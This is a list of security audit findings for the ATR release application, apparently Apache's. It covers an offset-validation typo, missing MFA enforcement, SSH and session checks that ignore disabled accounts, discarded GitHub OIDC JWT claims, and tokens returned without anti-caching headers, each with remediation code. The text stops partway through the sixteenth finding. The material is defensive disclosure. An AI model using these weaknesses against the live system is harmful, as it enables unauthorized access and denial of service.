# Security Issues

---

## Issue: FINDING-001 - Pagination Offset Validation Bypassed Due to Typo

**Labels:** bug, security, priority:critical, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The pagination validation function contains a typo that prevents offset validation from executing. The code checks `hasattr(query_args, 'offest')` instead of `hasattr(query_args, 'offset')`, causing the validation block to never execute. This allows unbounded offset values to reach database queries, enabling attackers to trigger expensive database queries that force SQLite to scan millions of rows, causing DoS through resource exhaustion.

### Details
**Affected Files:**
- `atr/api/__init__.py` lines 45-56

The typo in the attribute name check causes the `hasattr()` function to always return False, making the entire validation block dead code. This allows:
- Negative offset values
- Arbitrarily large offset values (e.g., 999,999,999)
- Database queries that scan millions of rows
- Service degradation through resource exhaustion

### Recommended Remediation
Fix the typo on the line checking the offset attribute:

```python
# Change from:
if hasattr(query_args, 'offest'):
# To:
if hasattr(query_args, 'offset'):
```

Restore validation of the offset parameter to enforce the intended maximum of 1,000,000.

### Acceptance Criteria
- [ ] Typo corrected from 'offest' to 'offset'
- [ ] Offset validation executes correctly for all API endpoints
- [ ] Large offset values (>1,000,000) are rejected with appropriate error
- [ ] Negative offset values are rejected
- [ ] Unit test verifying offset validation executes correctly

### References
- Source reports: L2:1.3.3.md
- Related findings: None
- ASVS sections: 1.3.3
- CWE: CWE-20

### Priority
Critical

---

## Issue: FINDING-002 - Pagination Offset Validation Completely Bypassed Due to Typo

**Labels:** bug, security, priority:critical, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
A critical typo in the pagination validation function causes offset validation to be completely bypassed for public API endpoints. The function checks for 'offest' (misspelled) instead of 'offset', meaning the validation never executes. Unauthenticated attackers can trigger expensive database queries with arbitrarily large offset values (e.g., offset=999999999), causing excessive disk I/O and memory allocation in SQLite, leading to service degradation and potential denial of service.

### Details
**Affected Files:**
- `atr/api/__init__.py` lines 70-80
- `atr/api/__init__.py` line 96
- `atr/api/__init__.py` line 171

The misspelling in `hasattr(query_args, 'offest')` causes the validation block to never execute. This affects multiple public API endpoints that accept pagination parameters, allowing unauthenticated attackers to force the database to perform full table scans through millions of rows.

### Recommended Remediation
1. Fix the typo from 'offest' to 'offset' in `_pagination_args_validate()`
2. Add Pydantic field constraints with maximum offset (le=100000)
3. Add rate limiting (100 per minute) to public API endpoints
4. Add regression test to verify offset validation executes correctly

```python
# Fix the typo:
if hasattr(query_args, 'offset'):  # Changed from 'offest'
    if query_args.offset > 1000000 or query_args.offset < 0:
        raise ValueError("Offset must be between 0 and 1,000,000")
```

### Acceptance Criteria
- [ ] Typo corrected in pagination validation function
- [ ] Pydantic constraints added for offset field
- [ ] Rate limiting applied to public API endpoints
- [ ] Regression test added for offset validation
- [ ] Unit test verifying the fix

### References
- Source reports: L1:2.2.2.md
- Related findings: None
- ASVS sections: 2.2.2
- CWE: None specified

### Priority
Critical

---

## Issue: FINDING-003 - Pagination Offset Validation Completely Bypassed Due to Typo

**Labels:** bug, security, priority:critical, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The pagination validation function contains a typo that completely bypasses offset validation. The code checks `hasattr(query_args, "offest")` instead of `hasattr(query_args, "offset")`, causing the validation block to never execute. This allows arbitrarily large offset values to be passed to SQLite queries, potentially causing performance degradation and resource exhaustion attacks through repeated queries with extreme offset values (e.g., forcing database to scan millions of rows for each request).

### Details
**Affected Files:**
- `atr/api/__init__.py` lines 570-582

The typo in the hasattr check prevents validation logic from executing. Attackers can exploit this by issuing requests with extreme offset values, forcing expensive database operations that can degrade service performance or cause denial of service.

### Recommended Remediation
1. Fix typo from `hasattr(query_args, "offest")` to `hasattr(query_args, "offset")`
2. Add unit tests specifically covering offset validation with boundary values:
   - offset=0 (should pass)
   - offset=1000000 (should pass)
   - offset=1000001 (should fail)
   - offset=-1 (should fail)
3. Add integration tests verifying the validation executes
4. Consider using a linter that detects typos in string literals used for attribute access

```python
# Fix:
if hasattr(query_args, "offset"):  # Changed from "offest"
```

### Acceptance Criteria
- [ ] Typo corrected in hasattr check
- [ ] Unit tests added for boundary values
- [ ] Integration tests verify validation executes
- [ ] Linter rule added to prevent similar typos
- [ ] Unit test verifying the fix

### References
- Source reports: L2:2.1.2.md
- Related findings: None
- ASVS sections: 2.1.2
- CWE: CWE-20

### Priority
Critical

---

## Issue: FINDING-004 - Pagination Offset Validation Bypassed Due to Typo

**Labels:** bug, security, priority:critical, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The pagination offset validation contains a typo that completely bypasses the intended security control. The code checks for `hasattr(query_args, 'offest')` instead of `hasattr(query_args, 'offset')`, causing the validation block to never execute. This allows attackers to force expensive queries with extremely large offsets (e.g., offset=999999999), causing significant database load through full table scans and potential denial of service.

### Details
**Affected Files:**
- `atr/api/__init__.py` lines 44-56

The misspelled attribute name in the hasattr check makes the validation unreachable. Without offset limits, attackers can:
- Force SQLite to scan millions of rows
- Consume excessive CPU and I/O resources
- Degrade service for legitimate users
- Potentially trigger out-of-memory conditions

### Recommended Remediation
1. Fix typo in line checking offset attribute: change `hasattr(query_args, 'offest')` to `hasattr(query_args, 'offset')`
2. Add unit tests that explicitly test offset validation with extreme values
3. Consider adding type hints to catch attribute name mismatches at development time
4. Add linter rule to detect potential typos in hasattr() calls

```python
# Fix:
if hasattr(query_args, 'offset'):  # Changed from 'offest'
    if query_args.offset > 1000000 or query_args.offset < 0:
        raise ValueError("Invalid offset")
```

### Acceptance Criteria
- [ ] Typo corrected in hasattr check
- [ ] Unit tests added testing offset validation
- [ ] Type hints added to prevent attribute mismatches
- [ ] Linter rule configured
- [ ] Unit test verifying the fix

### References
- Source reports: L2:2.3.2.md
- Related findings: None
- ASVS sections: 2.3.2
- CWE: None specified

### Priority
Critical

---

## Issue: FINDING-005 - Vote Duration Not Stored, Preventing Resolution Time Enforcement

**Labels:** bug, security, priority:critical, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The vote duration is not stored on the Release model, only in task arguments. This architectural gap makes it impossible to enforce that votes remain open for their specified duration before resolution. Committee members can approve releases immediately without the mandatory review period, bypassing Apache governance requirements and potentially allowing releases without proper oversight.

### Details
**Affected Files:**
- `atr/storage/writers/vote.py` lines 160-195
- `atr/storage/writers/vote.py` lines 199-233
- `atr/models/sql.py` (no line specified)

The vote duration is passed to the vote start task but never persisted to the database. When resolve() or resolve_manually() are called, there is no server-side check to ensure the minimum voting period has elapsed. This violates Apache governance policies requiring minimum vote durations (typically 72 hours).

### Recommended Remediation
1. Add `vote_duration_hours` field to Release model
2. Store duration when vote starts in `promote_to_candidate()`
3. Create `_validate_vote_duration_elapsed()` helper function:
   ```python
   def _validate_vote_duration_elapsed(release):
       if not release.vote_started or not release.vote_duration_hours:
           raise AccessError("Vote timing data missing")
       elapsed = datetime.utcnow() - release.vote_started
       required = timedelta(hours=release.vote_duration_hours)
       if elapsed < required:
           raise AccessError(f"Vote must remain open for {release.vote_duration_hours} hours")
   ```
4. Call validation in `resolve()` and `resolve_manually()` methods before allowing vote resolution
5. Add database migration for new column

### Acceptance Criteria
- [ ] vote_duration_hours field added to Release model
- [ ] Duration stored when vote starts
- [ ] Validation helper function created
- [ ] Validation called before vote resolution
- [ ] Database migration created and tested
- [ ] Unit test verifying early resolution is prevented

### References
- Source reports: L2:2.3.2.md
- Related findings: ASVS-232-HIGH-001, ASVS-232-MED-001
- ASVS sections: 2.3.2
- CWE: None specified

### Priority
Critical

---

## Issue: FINDING-006 - Release Announcement Performs Irreversible Filesystem Changes Before Database Commit

**Labels:** bug, security, priority:critical, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The release announcement operation—the highest-value business operation in the system—performs irreversible filesystem changes before attempting database commit. Files are moved from unfinished/ to finished/ directory (publicly accessible), prior revision directories are permanently deleted, and download hard links are created BEFORE the database commit is attempted. If DB commit fails, the filesystem is already modified with no rollback path, leaving the system in an inconsistent state where files are published but the database shows the release as unpublished.

### Details
**Affected Files:**
- `atr/storage/writers/announce.py` lines 128-195
- `atr/storage/writers/announce.py` lines 70-110
- `atr/storage/writers/announce.py` lines 195-210

This violates the fundamental principle of transaction integrity where reversible operations should precede irreversible ones. The operation sequence is:
1. Filesystem operations (irreversible) - move files to public directory, delete old revisions
2. Database commit (reversible, but failure leaves inconsistent state)

If the database commit fails after filesystem operations succeed, the release artifacts are publicly accessible but the database indicates the release is not announced.

### Recommended Remediation
**Option 1 (Recommended): Database-First Approach**
1. Perform DB promotion FIRST (can be rolled back)
2. Then perform filesystem operations
3. If filesystem operations fail, implement compensating transaction to revert database changes

```python
def announce_release():
    # 1. Update database FIRST
    release.phase = ReleasePhase.RELEASE
    release.announced_at = datetime.utcnow()
    db.session.commit()  # Commit database changes first
    
    try:
        # 2. Perform filesystem operations
        move_to_finished()
        delete_prior_revisions()
        create_download_links()
    except Exception as e:
        # 3. Rollback database on filesystem failure
        release.phase = ReleasePhase.RELEASE_PREVIEW
        release.announced_at = None
        db.session.commit()
        raise
```

**Option 2: Two-Phase Commit with Recovery Task**
1. Add intermediate RELEASE_ANNOUNCING phase
2. Perform filesystem operations
3. Mark finished with periodic recovery task for stuck announcements

### Acceptance Criteria
- [ ] Database commit occurs before filesystem operations
- [ ] Compensating transaction implemented for filesystem failures
- [ ] Unit tests verify rollback on filesystem errors
- [ ] Integration tests verify transaction integrity
- [ ] Recovery mechanism for stuck operations

### References
- Source reports: L2:2.3.3.md
- Related findings: None
- ASVS sections: 2.3.3
- CWE: None specified

### Priority
Critical

---

## Issue: FINDING-007 - Web Routes Use Single-Factor Authentication Only

**Labels:** bug, security, priority:critical, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
All web routes in ATR use only Requirements.committer check (verifying any authenticated session exists) without enforcing MFA. While comprehensive MFA infrastructure exists within ASFQuart framework (Requirements.mfa_enabled, ClientSession.mfa field, OAuth provider MFA support), ATR never invokes or enforces MFA at any web authentication entry point. The Requirements.mfa_enabled control is defined, tested, and functional but is never called anywhere in the ATR codebase. Users with mfa: False in their session can access the entire application including release creation, voting, publishing, key management, and token creation operations.

### Details
**Affected Files:**
- `atr/blueprints/get.py` line 74
- `atr/blueprints/post.py` line 95
- `atr/server.py` lines 310-355
- `src/asfquart/auth.py` (no line specified)
- `src/asfquart/session.py` (no line specified)

This is a Type B vulnerability where the security control exists but is not invoked. All web routes decorated with `@auth.require({auth.Requirements.committer})` allow access without MFA verification, even though the framework provides full MFA support.

### Recommended Remediation
**Option A (Per-Route Enforcement - Recommended):**
Change route decorators in `atr/blueprints/get.py` and `post.py`:
```python
# Change from:
@auth.require({auth.Requirements.committer})
# To:
@auth.require({auth.Requirements.committer, auth.Requirements.mfa_enabled})
```

**Option B (Global Enforcement):**
Add before_request hook in `atr/server.py`:
```python
@app.before_request
async def enforce_mfa():
    if request.path.startswith('/auth') or request.path.startswith('/static'):
        return  # Exempt OAuth callback and static assets
    
    session = await asfquart.session.read(request)
    if session and not getattr(session, 'mfa', False):
        await session.clear()
        raise ASFQuartException(
            "MFA required. Please enable MFA at https://id.apache.org/mfa",
            errorcode=403
        )
```

### Acceptance Criteria
- [ ] MFA enforcement added to all web routes or globally
- [ ] Users without MFA are redirected to enable it
- [ ] OAuth callback and static assets exempted from check
- [ ] Integration tests verify MFA enforcement
- [ ] Documentation updated with MFA requirement
- [ ] Unit test verifying MFA is required

### References
- Source reports: L2:6.3.3.md
- Related findings: ASVS-633-CRIT-002, ASVS-633-HIGH-004
- ASVS sections: 6.3.3
- CWE: None specified

### Priority
Critical

---

## Issue: FINDING-008 - Admin Routes Lack MFA Despite Elevated Privileges

**Labels:** bug, security, priority:critical, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
Administrative functions including JWT key rotation, bulk token revocation, session impersonation, and release deletion are accessible with single-factor authentication only. The `_check_admin_access()` function in admin.py and `authenticate()` function in common.py verify that a session exists and check admin privileges, but never inspect the `web_session.mfa` field. A compromised admin password grants full administrative control without additional verification. Administrative operations that can invalidate all JWTs globally, revoke user tokens, impersonate any user session, or permanently delete releases are all accessible without MFA.

### Details
**Affected Files:**
- `atr/blueprints/admin.py` lines 162-170
- `atr/blueprints/common.py` lines 53-59

The admin access check functions verify session existence and admin privileges but do not check MFA status. This allows admin accounts compromised through password theft alone to:
- Rotate JWT signing keys (invalidating all API access)
- Revoke any user's tokens
- Impersonate any user session
- Delete releases permanently
- View sensitive configuration

### Recommended Remediation
Add MFA check to both admin access functions:

**In `atr/blueprints/admin.py` (_check_admin_access):**
```python
async def _check_admin_access():
    web_session = await session.read(request)
    if not web_session:
        raise ASFQuartException("Authentication required", errorcode=401)
    
    # Add MFA check BEFORE admin privilege check
    if not getattr(web_session, 'mfa', False):
        raise ASFQuartException(
            "MFA required for admin access. Enable at https://id.apache.org/mfa",
            errorcode=403
        )
    
    if not web_session.admin:
        raise ASFQuartException("Admin privileges required", errorcode=403)
```

**In `atr/blueprints/common.py` (authenticate):**
```python
async def authenticate(session):
    if not ldap.is_active(session.asf_uid):
        raise ASFQuartException("Account not active", errorcode=401)
    
    # Add MFA check
    if not getattr(session, 'mfa', False):
        raise ASFQuartException(
            "MFA required. Enable at https://id.apache.org/mfa",
            errorcode=403
        )
```

### Acceptance Criteria
- [ ] MFA check added to _check_admin_access()
- [ ] MFA check added to authenticate()
- [ ] Non-MFA admin sessions rejected with 403
- [ ] Error messages direct users to MFA enrollment
- [ ] Integration tests verify MFA requirement for admin routes
- [ ] Unit test verifying the fix

### References
- Source reports: L2:6.3.3.md
- Related findings: ASVS-633-CRIT-001, ASVS-633-LOW-007
- ASVS sections: 6.3.3
- CWE: None specified

### Priority
Critical

---

## Issue: FINDING-009 - API PAT→JWT Exchange Operates Without MFA

**Labels:** bug, security, priority:critical, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The API authentication chain (PAT → JWT → API operations) operates entirely without MFA verification. The `jwt_create()` endpoint in `atr/api/__init__.py` and `issue_jwt()` function in `atr/storage/writers/tokens.py` validate PAT hash, expiration, and LDAP account status but never check MFA status. Combined with ASVS-633-HIGH-004 (PAT creation without MFA), this creates a complete MFA-free path for all API access. A compromised PAT provides indefinite API access through JWT renewal (30-minute JWTs renewable indefinitely). The entire API entry point has no MFA control whatsoever.

### Details
**Affected Files:**
- `atr/api/__init__.py` lines 474-492
- `atr/storage/writers/tokens.py` lines 97-113
- `atr/jwtoken.py` (no line specified)

The authentication flow is:
1. User creates PAT via web (no MFA check - see FINDING-050)
2. PAT exchanged for JWT via `/api/jwt/create` (no MFA check)
3. JWT used for API operations (no MFA check)

This creates a complete bypass of MFA requirements for all API operations.

### Recommended Remediation
Add MFA verification to `issue_jwt()` in `atr/storage/writers/tokens.py`:

```python
def issue_jwt(self, pat_value: str) -> str:
    """Issue JWT token from PAT, validating MFA status."""
    # Existing validation...
    pat = self._validate_pat(pat_value)
    
    # Query PAT record to check mfa_verified field
    # (requires schema change from ASVS-633-HIGH-004)
    if not pat.mfa_verified:
        raise storage.AccessError(
            "This PAT was created without MFA verification. "
            "Please enable MFA at https://id.apache.org/mfa and create a new PAT."
        )
    
    # Existing JWT issuance...
    return self._create_jwt(pat.asf_uid)
```

**Note:** This remediation depends on fixing FINDING-050 first to store MFA status with PATs.

### Acceptance Criteria
- [ ] MFA verification added to issue_jwt()
- [ ] PATs without MFA verification rejected
- [ ] Error message directs users to enable MFA
- [ ] Integration tests verify MFA requirement
- [ ] Depends on FINDING-050 being fixed first
- [ ] Unit test verifying the fix

### References
- Source reports: L2:6.3.3.md
- Related findings: ASVS-633-HIGH-004 (FINDING-050)
- ASVS sections: 6.3.3
- CWE: None specified

### Priority
Critical

---

## Issue: FINDING-010 - SSH Authentication Completely Bypasses Account Status Checks

**Labels:** bug, security, priority:critical, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
SSH authentication paths (both persistent keys and GitHub workflow keys) do not check LDAP account status (`is_active()`) before allowing authentication. The control exists in `atr/ldap.py` but is never called during SSH authentication in `atr/ssh.py`, allowing disabled/banned users to retain full SSH access to artifact repositories for rsync operations. This is a Type B vulnerability where the control exists but is not called in critical paths.

### Details
**Affected Files:**
- `atr/ssh.py` lines 90-118 (begin_auth for persistent keys)
- `atr/ssh.py` lines 124-148 (validate_public_key for workflow keys)

When a user authenticates via SSH:
1. SSH key is validated against database
2. Authentication succeeds if key matches
3. LDAP account status is NEVER checked
4. Disabled/banned users can continue using SSH

This allows disabled users to:
- Upload release artifacts via rsync
- Modify existing uploads
- Create new releases
- Access other projects' repositories

### Recommended Remediation
Add `ldap.is_active()` checks in both SSH authentication functions:

**In `begin_auth()` (persistent keys):**
```python
async def begin_auth(self, username: str):
    """Authenticate user with persistent SSH key."""
    # Existing key lookup...
    authorized_keys = self._load_user_keys(username)
    
    # Add account status check BEFORE allowing authentication
    if not ldap.is_active(username):
        logger.warning(f"SSH auth rejected for disabled account: {username}")
        return False
    
    return authorized_keys
```

**In `validate_public_key()` (workflow keys):**
```python
async def validate_public_key(self, username: str, key: asyncssh.SSHKey):
    """Validate GitHub workflow SSH key."""
    # Existing workflow key validation...
    asf_uid = self._map_workflow_key_to_user(key)
    
    # Add account status check
    if not ldap.is_active(asf_uid):
        logger.warning(f"SSH workflow auth rejected for disabled account: {asf_uid}")
        return False
    
    return True
```

**Defense-in-depth in `_step_02_handle_safely()`:**
```python
def _step_02_handle_safely(self, username: str, command: str):
    """Handle SSH operation with account revalidation."""
    # Revalidate account status at operation time
    if not ldap.is_active(username):
        raise Exception("Account disabled during operation")
    
    # Existing operation handling...
```

### Acceptance Criteria
- [ ] is_active() check added to begin_auth()
- [ ] is_active() check added to validate_public_key()
- [ ] Defense-in-depth check added to operation handler
- [ ] Failed auth attempts logged with reason
- [ ] Integration tests verify disabled accounts rejected
- [ ] Unit test verifying the fix

### References
- Source reports: L1:7.4.2.md
- Related findings: GitHub Issue #737
- ASVS sections: 7.4.2
- CWE: None specified

### Priority
Critical

---

## Issue: FINDING-011 - Global Session Validation Hook Checks Age But Not Account Status

**Labels:** bug, security, priority:critical, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The `validate_session_lifetime()` function runs as a `@app.before_request` hook on every HTTP request but only validates session age (created_at timestamp), not account status. This creates false security confidence as the infrastructure for global validation exists but the critical account status check is missing. The `ldap.is_active()` control exists and is used in `authenticate()` but is not called in this global hook, leading to inconsistent protection across routes where some routes check account status and others rely only on the global hook.

### Details
**Affected Files:**
- `atr/server.py` (before_request hook)

The global validation hook is perfectly positioned to enforce account status checks on every request, but currently only validates:
- Session existence
- Session age (idle timeout)
- Session absolute lifetime

Missing validation:
- LDAP account active status
- LDAP account banned status

This means disabled/banned users can continue using existing sessions for up to 72 hours until session expires naturally.

### Recommended Remediation
Add periodic account status revalidation to the `validate_session_lifetime()` hook with 5-minute cache interval to balance security vs LDAP load:

```python
@app.before_request
async def validate_session_lifetime():
    """Validate session age and account status."""
    web_session = await session.read(request)
    if not web_session:
        return
    
    # Existing age validation...
    now = datetime.utcnow()
    if (now - web_session.created_at) > ABSOLUTE_SESSION_MAX:
        await session.clear()
        raise ASFQuartException("Session expired", errorcode=401)
    
    # Add periodic account status revalidation
    last_checked = getattr(web_session, 'account_checked_at', None)
    if not last_checked or (now - last_checked) > timedelta(minutes=5):
        if not ldap.is_active(web_session.asf_uid):
            logger.warning(f"Clearing session for disabled account: {web_session.asf_uid}")
            await session.clear()
            raise ASFQuartException("Account disabled", errorcode=401)
        
        # Update session metadata
        web_session['account_checked_at'] = now
        await session.write(request, web_session)
```

### Acceptance Criteria
- [ ] Account status check added to global validation hook
- [ ] 5-minute cache interval implemented
- [ ] Session cleared if account disabled
- [ ] Session metadata updated with check timestamp
- [ ] Logging added for disabled account detection
- [ ] Unit test verifying the fix

### References
- Source reports: L1:7.4.2.md
- Related findings: None
- ASVS sections: 7.4.2
- CWE: None specified

### Priority
Critical

---

## Issue: FINDING-012 - No Server-Side Session Store Prevents Session Termination

**Labels:** bug, security, priority:critical, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The application uses Quart's built-in session mechanism, which stores session data exclusively in client-side signed cookies. There is no server-side session store (database table, Redis, etc.) that tracks active sessions. Without a server-side store, the application cannot: (1) Enumerate all active sessions for a given user, (2) Invalidate sessions on other devices/browsers, (3) Implement 'terminate all other sessions' functionality. This architectural limitation makes it impossible to comply with ASVS 7.4.3 which requires offering session termination after authentication factor changes.

### Details
**Affected Files:**
- `src/asfquart/session.py` lines 37-65 (read)
- `src/asfquart/session.py` lines 68-98 (write)
- `src/asfquart/session.py` lines 101-109 (clear)

Current session architecture:
- All session data stored in client-side cookie
- Cookie is signed but not tracked server-side
- `clear()` only removes cookie from current response
- No ability to invalidate other sessions
- No session enumeration capability

### Recommended Remediation
Implement server-side session tracking with per-session invalidation:

**Option 1: Session Version Per User (Recommended)**
Add UserSessionVersion table tracking version number incremented on auth factor changes:

```python
# Database model
class UserSessionVersion(Base):
    __tablename__ = 'user_session_versions'
    asf_uid = Column(String, primary_key=True)
    version = Column(Integer, default=0)
    updated_at = Column(DateTime, default=datetime.utcnow)

# In session.read()
def read(request):
    cookie_data = self._load_cookie(request)
    if not cookie_data:
        return None
    
    # Check session version against server-side version
    session_version = cookie_data.get('session_version', 0)
    current_version = db.query(UserSessionVersion).filter_by(
        asf_uid=cookie_data['asf_uid']
    ).first()
    
    if current_version and session_version < current_version.version:
        # Session is outdated, invalidate it
        return None
    
    return ClientSession(cookie_data)

# Termination function
def terminate_all_sessions(asf_uid):
    """Increment version to invalidate all sessions for user."""
    version = db.query(UserSessionVersion).filter_by(asf_uid=asf_uid).first()
    if version:
        version.version += 1
    else:
        version = UserSessionVersion(asf_uid=asf_uid, version=1)
        db.add(version)
    db.commit()
```

**Option 2: Individual Session Tracking**
Add ActiveSession table with session_id, asf_uid, created_at, last_active, user_agent, ip_address to enable granular session management.

### Acceptance Criteria
- [ ] Server-side session tracking implemented
- [ ] Session version stored in cookie payload
- [ ] Version validated on every request
- [ ] terminate_all_sessions() function implemented
- [ ] terminate_all_other_sessions() function implemented
- [ ] Database migration created
- [ ] Unit test verifying session termination

### References
- Source reports: L2:7.4.3.md
- Related findings: ASVS-743-HIGH-001, ASVS-743-HIGH-002, ASVS-743-HIGH-003, ASVS-743-MEDIUM-001, ASVS-743-MEDIUM-002, ASVS-743-LOW-001
- ASVS sections: 7.4.3
- CWE: None specified

### Priority
Critical

---

## Issue: FINDING-013 - Authorization Bypass in Workflow Status Updates — JWT Payload Discarded

**Labels:** bug, security, priority:critical, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The workflow status update endpoint validates GitHub OIDC JWT tokens for authenticity but completely discards the payload containing repository and user information. This allows any valid GitHub OIDC token (even from non-Apache repositories) to modify workflow status for any project, directly violating BOPLA principles by allowing unauthorized modification of `status` and `message` fields. An attacker with a valid GitHub Actions OIDC token from apache/unrelated-repo can update workflow status for apache/target-repo.

### Details
**Affected Files:**
- `atr/api/__init__.py` lines 1091-1112

The endpoint accepts JWT and project_key parameters but:
1. Validates JWT signature (confirms it's from GitHub)
2. **Discards JWT payload** (underscore-prefixed variables `_payload`, `_asf_uid`)
3. Accepts user-supplied `project_key` without verification
4. Never checks if JWT's repository matches target project
5. Writes directly to database bypassing authorization layer

This allows cross-project privilege escalation where workflows from any Apache repository can modify status for any other project.

### Recommended Remediation
Use the JWT payload to verify authorization:

```python
@app.post('/api/workflow/status')
async def update_distribution_task_status(data: WorkflowStatusUpdate):
    # Validate JWT and CAPTURE results (remove underscores)
    payload, asf_uid = validate_trusted_jwt(data.github_oidc_token)
    
    # Extract repository from JWT payload
    jwt_repository = payload.get('repository', '')
    jwt_project_key = jwt_repository.removeprefix('apache/')
    
    # Verify user-supplied project_key matches JWT source
    if jwt_project_key != data.project_key:
        raise ASFQuartException(
            f"JWT from repository '{jwt_repository}' cannot update project '{data.project_key}'",
            errorcode=403
        )
    
    # Use storage layer with proper authorization
    write = storage.write(asf_uid)
    write.as_project_committee_member(data.project_key).workflow.update_status(
        workflow_id=data.workflow_id,
        status=data.status,
        message=data.message
    )
```

Apply same fix to:
- `distribute_ssh_register`
- `distribution_record_from_workflow`
- `publisher_distribution_record`
- `publisher_release_announce`
- `publisher_ssh_register`
- `publisher_vote_resolve`

### Acceptance Criteria
- [ ] JWT payload captured instead of discarded
- [ ] Project derived from JWT repository claim
- [ ] User-supplied project_key verified against JWT
- [ ] Storage authorization layer used
- [ ] Integration test verifying cross-project rejection
- [ ] Audit log entries added
- [ ] Unit test verifying the fix

### References
- Source reports: L2:8.2.3.md
- Related findings: ASVS-823-CRI-002 (FINDING-014)
- ASVS sections: 8.2.3
- CWE: None specified

### Priority
Critical

---

## Issue: FINDING-014 - Committee Association Bypass in Key Management

**Labels:** bug, security, priority:critical, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The key details update function performs committee membership authorization checks **after** committing changes to the database. This allows key owners to associate their keys with arbitrary committees, even those they're not members of. The authorization check that occurs post-commit silently ignores failures without rolling back the transaction, leaving unauthorized key-committee associations persisted in the database.

### Details
**Affected Files:**
- `atr/post/keys.py` lines 87-114

The vulnerable code flow:
1. User submits form with selected committees
2. Code fetches committees directly from database (no authorization)
3. Code assigns committees to key.committees relationship
4. **Database commit occurs**
5. Authorization check happens in as_committee_participant()
6. If check fails, error is ignored (no rollback)

This allows any key owner to:
- Associate their key with any committee
- Have their key appear in unauthorized committee KEYS files
- Potentially sign releases for committees they don't belong to

### Recommended Remediation
Validate committee membership BEFORE any database modification:

```python
async def details(session: ClientSession, form: KeyDetailsForm):
    """Update key details with committee membership validation."""
    # Fetch key and verify ownership
    key = db.query(OpenPGPKey).filter_by(
        fingerprint=form.fingerprint,
        asf_uid=session.asf_uid
    ).first()
    
    if not key:
        raise ASFQuartException("Key not found or unauthorized", errorcode=404)
    
    # VALIDATE COMMITTEE MEMBERSHIP BEFORE MODIFYING DATABASE
    write = storage.write(session)
    selected_committees = form.committees.data  # List of committee keys
    
    for committee_key in selected_committees:
        try:
            # This will raise AccessError if not a member
            write.as_committee_participant(committee_key)
        except storage.AccessError:
            raise ASFQuartException(
                f"You are not a member of committee '{committee_key}'",
                errorcode=403
            )
    
    # Only now update database
    # Disassociate from old committees
    for committee in list(key.committees):
        if committee.key not in selected_committees:
            write.as_committee_participant(committee.key).keys.disassociate_fingerprint(
                key.fingerprint
            )
    
    # Associate with new committees
    for committee_key in selected_committees:
        write.as_committee_participant(committee_key).keys.associate_fingerprint(
            key.fingerprint
        )
    
    db.commit()
```

### Acceptance Criteria
- [ ] Committee membership validated BEFORE database modification
- [ ] Storage layer used for all authorization-sensitive operations
- [ ] Committee association updates moved to storage layer
- [ ] AccessError properly handled and displayed to user
- [ ] Integration test attempting unauthorized association
- [ ] Unit test verifying the fix

### References
- Source reports: L2:8.2.3.md
- Related findings: ASVS-823-CRI-001 (FINDING-013)
- ASVS sections: 8.2.3
- CWE: None specified

### Priority
Critical

---

## Issue: FINDING-015 - JWT Creation API Returns Token Without Anti-Caching Headers

**Labels:** bug, security, priority:critical, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The `/api/jwt/create` endpoint returns JWT bearer tokens in JSON responses without setting `Cache-Control: no-store` headers. This allows browsers and intermediary proxies to cache valid authentication tokens, potentially exposing them through browser history, shared workstations, or proxy logs. This is a Type B gap where the control exists in `jwt_post` but is not called in this endpoint.

### Details
**Affected Files:**
- `atr/api/__init__.py` lines 444-462

Data flow:
1. User provides PAT credential
2. `jwt_create` endpoint validates PAT
3. JWT token returned in JSON body
4. **No Cache-Control header set**
5. Browser/proxy may cache response
6. Token exposed in cache files, browser history

Attack scenario:
- User creates JWT on shared workstation
- Browser caches the response
- Next user accesses browser cache
- JWT token retrieved and used for unauthorized API access

### Recommended Remediation
Add `Cache-Control: no-store` header to the response:

**Option A: Fix at endpoint level**
```python
@app.post('/api/jwt/create')
async def jwt_create(data: JWTCreateRequest):
    # Existing validation and JWT creation...
    jwt_token = issue_jwt(data.pat_value)
    
    # Create response object and add header
    response = quart.jsonify({'jwt': jwt_token})
    response.headers['Cache-Control'] = 'no-store'
    response.headers['Pragma'] = 'no-cache'
    return response
```

**Option B (Preferred): Add global middleware**
See FINDING-017 for global middleware solution that fixes all endpoints.

### Acceptance Criteria
- [ ] Cache-Control: no-store header added to response
- [ ] Pragma: no-cache header added for HTTP/1.0 compatibility
- [ ] Integration test verifying headers present
- [ ] Browser testing confirms no caching
- [ ] Unit test verifying the fix

### References
- Source reports: L2:14.3.2.md
- Related findings: ASVS-1432-CRI-005 (FINDING-017)
- ASVS sections: 14.3.2
- CWE: None specified

### Priority
Critical

---

## Issue: FINDING-016 - OAuth Session Display Returns Full Session Without Anti-Caching Headers

**Labels:** bug, security, priority:critical, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The OAuth `/auth` endpoint returns complete session data including user identity, email, organizational roles, committee memberships, and admin status without anti-caching headers. The `ClientSession` object exposes highly sensitive authorization information that should never be cached. On shared workstations, this reveals privileged user identity and access levels to subsequent users through browser cache.

### Details
**Affected Files:**
- `src/asfquart/generics.py` lines 121-127

Data flow:
1. Session cookie provided
2. `asfquart.session.read()` loads full session
3. `ClientSession` dict returned (uid, email, committees, membership flags, admin status)
4. **No Cache-Control header set**
5. Browser caches response
6. Full session data including organizational roles cached

Information exposed in cache:
- ASF UID (username)
- Email address
- Committee memberships
- Admin status (boolean)
- MFA status
- LDAP groups
- Authorization flags

### Recommended Remediation
Create a `quart.Response` object and set anti-caching headers:

```python
@app.get('/auth')
async def auth():
    """Return current session with anti-caching headers."""
    client_session = await asfquart.session.read(request)
